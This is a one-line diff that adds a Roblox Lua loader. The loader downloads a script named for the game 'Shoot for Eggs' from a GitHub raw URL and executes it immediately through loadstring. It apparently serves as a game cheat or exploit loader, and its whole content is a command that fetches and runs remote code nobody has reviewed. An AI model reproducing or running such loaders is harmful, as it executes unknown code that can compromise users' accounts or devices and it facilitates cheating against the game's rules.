@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/shoot-for-eggs-spam5-9iv6j8qumd0tin.lua"))()
